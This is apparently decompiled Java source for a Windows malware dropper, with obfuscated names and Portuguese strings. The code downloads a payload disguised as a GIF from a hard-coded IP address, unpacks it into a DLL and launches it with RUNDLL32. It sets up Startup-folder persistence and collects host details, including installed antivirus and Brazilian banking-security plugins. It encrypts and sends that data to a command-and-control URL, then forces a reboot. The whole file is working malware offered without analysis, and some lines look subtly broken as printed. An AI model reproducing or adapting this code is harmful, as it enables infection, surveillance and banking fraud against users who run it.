import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileFilter;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.FileChannel;
import java.nio.channels.ReadableByteChannel;
import java.util.Base64;
import java.util.Base64.Encoder;
import java.util.Locale;
import java.util.Random;
import java.util.zip.InflaterInputStream;

public class HOgx9bJeKIVjA
{
  private static String string0;
  private static String string1;
  private static String string2;
  private static String string3;
  private static String string4;
  private static String string5;
  private static String string6;
  private static String string7;
  private static String string8;
  private static long long0;
  private static String string9;
  
  public static String sfunc0(String string11)
    throws Exception
  {
    String string12 = "";
    if (string11.isEmpty()) {
      return string12;
    }
    int int0 = string0.length();
    int int1 = -1;
    int int2 = 0;
    int int3 = 0;
    int int4 = 0;
    int int5 = 0;
    
    int2 = Integer.parseInt(string11.substring(0, 2), 16);
    for (int3 = 2; int3 < string11.length(); int3 += 2)
    {
      int4 = Integer.parseInt(string11.substring(int3, int3 + 2), 16);
      if (int1 < int0 - 1) {
        int1++;
      } else {
        int1 = 0;
      }
      int5 = int4 ^ string0.charAt(int1);
      if (int5 <= int2) {
        int5 = 255 + int5 - int2;
      } else {
        int5 -= int2;
      }
      string12 = string12 + (char)int5;
      int2 = int4;
    }
    return string12;
  }
  
  public static String sfunc1(String string14)
    throws Exception
  {
    String string15 = "";
    if (string14.isEmpty()) {
      return string15;
    }
    int int6 = string0.length();
    int int7 = -1;
    int int8 = 0;
    int int9 = 0;
    int int10 = 0;
    int int11 = 256;
    
    Random rand0 = new Random();
    int8 = rand0.nextInt(int11 + 1);
    string15 = String.format(string9, new Object[] { Integer.valueOf(int8) });
    for (int9 = 0; int9 < string14.length(); int9++)
    {
      int10 = (string14.charAt(int9) + int8) % 255;
      if (int7 < int6 - 1) {
        int7++;
      } else {
        int7 = 0;
      }
      int10 ^= string0.charAt(int7);
      string15 = string15 + String.format(string9, new Object[] { Integer.valueOf(int10) });
      int8 = int10;
    }
    return string15;
  }
  
  public static boolean bool0(String string16)
    throws Exception
  {
    File file0 = new File(string16);
    boolean boolRes = file0.exists();
    return boolRes;
  }
  
  public static String sfunc2()
    throws Exception
  {
    String string18 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    String string19 = "abcdefghijklmnopqrstuvwxyz";
    String string20 = "1234567890";
    String string21 = string18 + string19 + string20;
    
    Random rand1 = new Random();
    Random rand2 = new Random();
    int intTamanho = rand2.nextInt(10);
    String string22 = "";
    int intIndex = -1;
    for (int intCont = 0; intCont < intTamanho + 1; intCont++)
    {
      intIndex = rand1.nextInt(string21.length());
      string22 = string22 + string21.substring(intIndex, intIndex + 1);
    }
    return string22;
  }
  
  public static String sfunc3(String string24)
    throws Exception
  {
    String string25 = "UTF-8";
    String string26 = Base64.getEncoder().encodeToString(string24
      .getBytes(string25));
    return string26;
  }
  
  public static String sfunc4()
    throws Exception
  {
    String string28 = "";
    try
    {
      String string29 = "reg query HKLM\\software\\microsoft\\windows\\currentversion\\policies\\System /v EnableLUA";
      Process reader0 = Runtime.getRuntime().exec(string29);
      reader0.waitFor();
      
      BufferedReader reader0 = new BufferedReader(new InputStreamReader(reader0.getInputStream()));
      String string30;
      while ((string30 = reader0.readLine()) != null) {
        string28 = string28 + string30;
      }
      reader0.close();
      
      int intExitCodigo = reader0.exitValue();
      if (intExitCodigo != 0) {
        string28 = "nao";
      } else if (string28.contains("0x0")) {
        string28 = "nao";
      } else {
        string28 = "sim";
      }
    }
    catch (Exception e)
    {
      string28 = "nao";
      e.printStackTrace();
    }
    return string28;
  }
  
  public static String sfunc5()
    throws Exception
  {
    String string32 = "";
    try
    {
      File file1 = File.createTempFile("verifica", 
        ".vbs");
      file1.deleteOnExit();
      FileWriter writer0 = new FileWriter(file1, true);
      BufferedWriter writer1 = new BufferedWriter(writer0);
      
      writer1.write("Set objNetwork = CreateO");
      writer1.write("bject(\"Wscript.Network\")");
      writer1.newLine();
      writer1.write("strComputer = objNetwork.ComputerName");
      writer1.newLine();
      writer1.write("strUser = objNetwork.UserName");
      writer1.newLine();
      writer1.write("isAdministrator = false");
      writer1.newLine();
      writer1.write("Set objGroup = GetObject(\"WinNT://\"");
      writer1.write(" & strComputer & \"/Administradores\")");
      writer1.newLine();
      writer1.write("For Each objUser in objGroup.Members");
      writer1.newLine();
      writer1.write("If objUser.Name = strUser Then");
      writer1.newLine();
      writer1.write("isAdministrator = true");
      writer1.newLine();
      writer1.write("End If");
      writer1.newLine();
      writer1.write("Next");
      writer1.newLine();
      writer1.write("If isAdministrator Then Wscript.Echo");
      writer1.write(" \"sim\" Else Wscript.Echo \"nao\"");
      writer1.close();
      writer0.close();
      
      Process reader1 = Runtime.getRuntime().exec("cscript /NoLogo \"" + file1
        .getPath() + "\"");
      reader1.waitFor();
      BufferedReader reader1 = new BufferedReader(new InputStreamReader(reader1.getInputStream()));
      String string33 = "";
      while ((string33 = reader1.readLine()) != null) {
        string32 = string32 + string33;
      }
      reader1.close();
    }
    catch (Exception localException) {}
    return string32.trim();
  }
  
  public static String sfunc6()
    throws Exception
  {
    String string35 = "";
    try
    {
      InetAddress addr0 = InetAddress.getLocalHost();
      NetworkInterface interface0 = NetworkInterface.getByInetAddress(addr0);
      byte[] array2 = interface0.getHardwareAddress();
      
      StringBuilder builder0 = new StringBuilder();
      for (int i = 0; i < array2.length; i++) {
        builder0.append(String.format("%02X%s", new Object[] { Byte.valueOf(array2[i]), i < array2.length - 1 ? "-" : "" }));
      }
      string35 = builder0.toString();
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
    return string35.trim();
  }
  
  public static String sfunc7()
    throws Exception
  {
    String string37 = "";
    try
    {
      File file2 = File.createTempFile("listagem", 
        ".vbs");
      file2.deleteOnExit();
      FileWriter writer2 = new FileWriter(file2, true);
      BufferedWriter writer3 = new BufferedWriter(writer2);
      
      writer3.write("On Error Resume Next");
      writer3.newLine();
      writer3.write("Set objWMIService_AV = ");
      writer3.write("GetObject(\"winmgmts:\\\\.\\root\\SecurityCenter\")");
      writer3.newLine();
      writer3.write("Set colItems = objWMIService_AV.");
      writer3.write("ExecQuery(\"Select * from AntiVirusProduct\")");
      writer3.newLine();
      writer3.write("For Each objAntiVirusProduct In colItems");
      writer3.newLine();
      writer3.write("strdisplayName = (objAntiVi");
      writer3.write("rusProduct.displayName)");
      writer3.newLine();
      writer3.write("If strdisplayName <> \"\" Then");
      writer3.newLine();
      writer3.write("WScript.Echo strdisplayName");
      writer3.newLine();
      writer3.write("End If");
      writer3.newLine();
      writer3.write("Next");
      writer3.newLine();
      writer3.write("Set objWMIService_AV2 = GetObject(");
      writer3.write("\"winmgmts:\\\\.\\root\\SecurityCenter2\")");
      writer3.newLine();
      writer3.write("Set colItems2 = objWMIService_AV2.Exec");
      writer3.write("Query(\"Select * from AntiVirusProduct\")");
      writer3.newLine();
      writer3.write("For Each objAntiVirusProduct2 In colItems2");
      writer3.newLine();
      writer3.write("strdisplayName2 = (objAnti");
      writer3.write("VirusProduct2.displayName)");
      writer3.newLine();
      writer3.write("If strdisplayName2 <> \"\" Then");
      writer3.newLine();
      writer3.write("WScript.Echo strdisplayName2");
      writer3.newLine();
      writer3.write("End If");
      writer3.newLine();
      writer3.write("Next");
      writer3.close();
      writer2.close();
      
      Process reader2 = Runtime.getRuntime().exec("cscript /NoLogo \"" + file2
        .getPath() + "\"");
      reader2.waitFor();
      BufferedReader reader2 = new BufferedReader(new InputStreamReader(reader2.getInputStream()));
      String string38 = "";
      while ((string38 = reader2.readLine()) != null) {
        if (string37.isEmpty()) {
          string37 = string37 + string38;
        } else {
          string37 = string37 + " | " + string38;
        }
      }
      reader2.close();
    }
    catch (Exception localException) {}
    return string37.trim();
  }
  
  public static String sfunc8()
    throws Exception
  {
    String string40 = new String(InetAddress.getLocalHost().getHostName());
    return string40.toUpperCase();
  }
  
  public static String sfunc9()
    throws Exception
  {
    String string42 = "";
    Locale locale0 = Locale.getDefault();
    String string43 = locale0.getCountry().toLowerCase();
    String string44 = locale0.getDisplayCountry().toLowerCase();
    String string45 = locale0.getLanguage().toLowerCase();
    
    string42 = string44 + " " + string45 + "-" + string43;
    return string42;
  }
  
  private static String sfunc10(File[] array4)
    throws Exception
  {
    String string47 = "";
    File[] arrArquivosGPC = array4;
    int j = array4.length;
    for (int i = 0; i < j; i++)
    {
      File file3 = arrArquivosGPC[i];
      String string48 = String.valueOf(file3);
      String[] array6 = string48.split("\\\\");
      String strTemp = array6[(array6.length - 1)];
      int intTemp = strTemp.indexOf(".");
      strTemp = strTemp.substring(0, intTemp);
      if (string47.isEmpty()) {
        string47 = string47 + strTemp;
      } else {
        string47 = string47 + " | " + strTemp;
      }
    }
    return string47;
  }
  
  private static File[] arrayFunc0(String string50, String string51)
    throws Exception
  {
    File file4 = new File(string50);
    FileFilter file4Filter = null;
    if (string51 != null) {
      file4Filter = new FileFilter()
      {
        public boolean accept(File objArquivo)
        {
          return objArquivo.getAbsolutePath().endsWith(this.val$string51);
        }
      };
    }
    return file4.listFiles(file4Filter);
  }
  
  public static String sfunc11()
    throws Exception
  {
    String string53 = "";
    String string54 = "";
    String string55 = "";
    String string56 = "";
    String string57 = "";
    
    string54 = System.getenv("ProgramFiles(X86)");
    if (string54 != null) {
      string53 = System.getenv("ProgramFiles(X86)") + "\\GbPlugin\\";
    } else {
      string53 = System.getenv("ProgramFiles") + "\\GbPlugin\\";
    }
    if (bool0(string53)) {
      string57 = sfunc10(arrayFunc0(string53, ".gpc")).toUpperCase();
    } else {
      string57 = "";
    }
    if (string54 != null)
    {
      string55 = string54 + "\\AppBrad\\";
      if (bool0(string55)) {
        if (string57.isEmpty()) {
          string57 = "AppBrad";
        } else {
          string57 = string57 + " | AppBrad";
        }
      }
    }
    else
    {
      string55 = System.getenv("ProgramFiles") + "\\AppBrad\\";
      if (bool0(string55)) {
        if (string57.isEmpty()) {
          string57 = "AppBrad";
        } else {
          string57 = string57 + " | AppBrad";
        }
      }
    }
    if (string54 != null)
    {
      string56 = string54 + "\\scpbrad\\";
      if (bool0(string56)) {
        if (string57.isEmpty()) {
          string57 = "Brad";
        } else {
          string57 = string57 + " | Brad";
        }
      }
    }
    else
    {
      string56 = System.getenv("ProgramFiles") + "\\scpbrad\\";
      if (bool0(string56)) {
        if (string57.isEmpty()) {
          string57 = "Brad";
        } else {
          string57 = string57 + " | Brad";
        }
      }
    }
    return string57;
  }
  
  public static String sfunc12()
    throws Exception
  {
    String string59 = "";
    string59 = System.getProperty("user.name");
    return string59;
  }
  
  public static String sfunc13()
    throws Exception
  {
    String string61 = "";
    String string62 = "";
    String string63 = "";
    
    string61 = System.getProperty("os.name");
    
    string62 = System.getenv("PROCESSOR_ARCHITECTURE");
    string63 = System.getenv("PROCESSOR_ARCHITEW6432");
    
    string61 = string61 + ((string62.endsWith("64")) || ((string63 != null) && (string63.endsWith("64"))) ? "(64)" : "(32)");
    return string61;
  }
  
  public static void vfunc0(String string64)
    throws Exception
  {
    URL url0 = new URL(string64);
    HttpURLConnection connect0 = (HttpURLConnection)url0.openConnection();
    connect0.setRequestMethod("GET");
    connect0.setRequestProperty("User-Agent", 
      "Mozilla/5.0");
    connect0.setDoOutput(true);
    
    int int20 = connect0.getResponseCode();
    if (int20 == 200)
    {
      BufferedReader reader3 = new BufferedReader(new InputStreamReader(connect0.getInputStream()));
      
      StringBuffer buffer0 = new StringBuffer();
      String string65;
      while ((string65 = reader3.readLine()) != null) {
        buffer0.append(string65);
      }
      reader3.close();
      
      System.out.println(buffer0.toString());
    }
  }
  
  public static void vfunc1(String string66, String string67)
    throws Exception
  {
    try
    {
      long0 = 0L;
      URL url1 = new URL(string66);
      ReadableByteChannel channel0 = Channels.newChannel(url1.openStream());
      FileOutputStream stream0 = new FileOutputStream(string67);
      stream0.getChannel().transferFrom(channel0, 0L, Long.MAX_VALUE);
      long0 = stream0.getChannel().size();
      stream0.close();
      channel0.close();
    }
    catch (IOException objExcessao)
    {
      objExcessao.printStackTrace();
    }
  }
  
  public static void vfunc2(String string68, String string69)
    throws Exception
  {
    FileInputStream stream1 = new FileInputStream(string68);
    FileOutputStream stream2 = new FileOutputStream(string69);
    InflaterInputStream stream3 = new InflaterInputStream(stream1);
    
    int int21 = 0;
    while ((int21 = stream3.read()) != -1) {
      stream2.write(int21);
    }
    stream3.close();
    stream2.close();
    stream1.close();
  }
  
  public static void vfunc3()
    throws Exception
  {
    String string70 = "";
    
    string70 = string70 + sfunc9() + ",";
    string70 = string70 + sfunc6() + ",";
    string70 = string70 + sfunc8() + ",";
    string70 = string70 + sfunc12() + ",";
    string70 = string70 + sfunc13() + ",";
    string70 = string70 + string1 + ",";
    string70 = string70 + sfunc4() + ",";
    string70 = string70 + sfunc5() + ",";
    string70 = string70 + sfunc7() + ",";
    string70 = string70 + sfunc11() + ",";
    string70 = string70 + long0;
    
    string70 = String.format("%02X", new Object[] { Integer.valueOf(string0.length()) }) + string0 + sfunc1(string70);
    string70 = sfunc3(string70);
    string70 = sfunc2() + "=" + string70;
    
    vfunc0(string3 + "?" + string70);
  }
  
  public static void vfunc4()
    throws Exception
  {
    Process reader3 = Runtime.getRuntime().exec(
      "shutdown -r -t 30 -c  Atualizando...");
    reader3.waitFor();
  }
  
  public static void vfunc5()
    throws Exception
  {
    FileWriter writer4 = new FileWriter(new File(string8));
    writer4.close();
  }
  
  public static void vfunc6(String string71)
  {
    try
    {
      File file5 = File.createTempFile("criacao", 
        ".vbs");
      file5.deleteOnExit();
      FileWriter writer5 = new FileWriter(file5, true);
      BufferedWriter writer6 = new BufferedWriter(writer5);
      
      writer6.write("Dim oFSO");
      writer6.newLine();
      writer6.write("Set oFSO = CreateObject(\"Sc");
      writer6.write("ripting.FileSystemObject\")");
      writer6.newLine();
      writer6.write("oFSO.CreateFolder \"");
      writer6.write(string71 + "\"");
      writer6.newLine();
      writer6.close();
      writer5.close();
      Process reader4 = Runtime.getRuntime().exec("cscript /NoLogo \"" + file5
        .getPath() + "\"");
      reader4.waitFor();
    }
    catch (Exception objExecessao)
    {
      objExecessao.printStackTrace();
    }
  }
  
  public static void vfunc7(String string72, String string73, String string74)
    throws Exception
  {
    try
    {
      File file6 = new File(string72);
      FileWriter writer7 = new FileWriter(file6);
      BufferedWriter writer8 = new BufferedWriter(writer7);
      
      String string75 = string73;
      String[] array9 = string75.split("\\\\");
      
      writer8.write("@echo off");
      writer8.newLine();
      writer8.write(array9[0]);
      writer8.newLine();
      writer8.write("cd \\");
      writer8.newLine();
      for (int i = 1; i < array9.length - 1; i++)
      {
        writer8.write("cd " + array9[i]);
        writer8.newLine();
      }
      writer8.write("RUNDLL32 ");
      writer8.write(array9[(array9.length - 1)]);
      writer8.write(",");
      writer8.write(string74);
      writer8.close();
      writer7.close();
    }
    catch (Exception objExcessao)
    {
      objExcessao.printStackTrace();
    }
  }
  
  public static String sfunc14()
    throws Exception
  {
    String string77 = "";
    String string78 = "";
    try
    {
      string78 = "Startup";
      File file7 = File.createTempFile("pegadirsys", 
        ".vbs");
      file7.deleteOnExit();
      FileWriter writer9 = new FileWriter(file7);
      BufferedWriter writer10 = new BufferedWriter(writer9);
      
      writer10.write("Set WshShell = WScript.");
      writer10.write("CreateObject(\"WScript.Shell\")");
      writer10.newLine();
      
      writer10.write("wscript.echo WshShell.");
      writer10.write("SpecialFolders(\"");
      writer10.write(string78);
      writer10.write("\")");
      writer10.newLine();
      writer10.write("Set WSHShell = Nothing");
      writer10.close();
      writer9.close();
      
      Process reader5 = Runtime.getRuntime().exec("cscript /NoLogo \"" + file7
        .getPath() + "\"");
      reader5.waitFor();
      
      BufferedReader reader4 = new BufferedReader(new InputStreamReader(reader5.getInputStream()));
      
      String string79 = "";
      while ((string79 = reader4.readLine()) != null) {
        string77 = string77 + string79;
      }
      reader4.close();
    }
    catch (Exception objExcessao)
    {
      objExcessao.printStackTrace();
    }
    return string77;
  }
  
  public static void vfunc8(String string80, String string81)
    throws Exception
  {
    String string82 = sfunc14() + "\\" + string81 + ".lnk";
    try
    {
      File file8 = File.createTempFile("createlnk", 
        ".vbs");
      file8.deleteOnExit();
      FileWriter writer11 = new FileWriter(file8);
      BufferedWriter writer12 = new BufferedWriter(writer11);
      
      writer12.write("Set WshShell = WScript.");
      writer12.write("CreateObject(\"WScript.Shell\")");
      writer12.newLine();
      
      writer12.write("Set lnk = WshShell.");
      writer12.write("CreateShortcut(\"");
      writer12.write(string82);
      writer12.write("\")");
      writer12.newLine();
      
      writer12.write("lnk.TargetPath = \"");
      writer12.write(string80);
      writer12.write("\"");
      writer12.newLine();
      writer12.write("lnk.HotKey = \"ALT+CTRL+P\"");
      writer12.newLine();
      writer12.write("lnk.WindowStyle = \"1\"");
      writer12.newLine();
      
      writer12.write("lnk.Save");
      writer12.newLine();
      writer12.write("Set lnk = Nothing");
      writer12.newLine();
      writer12.close();
      writer11.close();
      
      Process reader6 = Runtime.getRuntime().exec("cscript /NoLogo \"" + file8
        .getPath() + "\"");
      reader6.waitFor();
    }
    catch (Exception objExcessao)
    {
      objExcessao.printStackTrace();
    }
  }
  
  public static void main(String[] args)
    throws Exception
  {
    string0 = "11KTIZP1vCrV5482yeLexeuoyuSXJWQJ2dtxDzauCAfck4ICy0iM7RSEi";
    char[] array11 = { '%', '0', '2', 'X' };
    string9 = new String(array11);
    string1 = "205";
    string3 = "http://149.56.198.214/flavorgreen.php";
    
    String string83 = System.getenv("APPDATA");
    
    string8 = string83 + "\\Microsoft\\";
    string8 += "bxr.log";
    if (!bool0(string8))
    {
      vfunc5();
      
      string4 = string83 + "\\" + sfunc2() + "\\";
      vfunc6(string4);
      
      string2 = "http://149.56.198.218/svrhostvks.gif";
      string5 = "svrhostvks.gif";
      string6 = "svrhostvks.dll";
      string7 = "FO12JC31LK4QE";
      
      vfunc1(string2, string4 + string5);
      
      vfunc2(string4 + string5, string4 + string6);
      
      String string84 = string4 + sfunc2() + ".cmd";
      
      vfunc7(string84, string4 + string6, string7);
      
      String string85 = string6.replace(".dll", "");
      
      vfunc8(string84, string85);
      try
      {
        vfunc3();
      }
      catch (Exception localException) {}
      vfunc4();
    }
  }
}
